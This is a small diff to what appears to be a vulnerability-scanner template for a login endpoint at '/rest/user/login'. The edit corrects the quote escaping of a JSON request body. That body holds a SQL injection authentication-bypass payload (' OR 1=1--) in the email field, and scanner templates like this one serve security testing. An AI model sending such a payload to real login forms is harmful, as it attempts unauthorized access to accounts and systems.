@@ -65,7 +65,7 @@ http:
     path:
       - "{{BaseURL}}/rest/user/login"
 
-    body: '{"email":"a@b.com'"'"' OR 1=1--","password":"x"}'
+    body: '{"email":"a@b.com'' OR 1=1--","password":"x"}'
     headers:
       Content-Type: "application/json"
 
